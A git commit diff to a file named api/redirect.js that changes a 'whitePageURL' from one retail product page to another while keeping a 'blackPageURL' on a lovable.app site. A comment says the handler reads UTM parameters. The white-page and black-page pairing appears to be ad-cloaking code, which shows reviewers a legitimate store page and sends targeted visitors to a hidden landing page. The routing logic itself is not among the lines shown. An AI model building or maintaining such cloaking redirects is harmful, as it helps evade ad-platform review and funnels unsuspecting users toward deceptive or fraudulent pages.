523df39bf710f4e89bff93b8f7d02cd46c1597b0
abdullahch3332 <abdullahch3332@gmail.com>
2025-11-01 03:11:56 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.otto.de/p/aniston-selected-strickponcho-mit-karo-muster-und-fransen-1813870858/";
+    const whitePageURL = "https://enamelcopenhagen.dk/products/hoops-twistie-drop-1";
     const blackPageURL = "https://instentquzzz.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
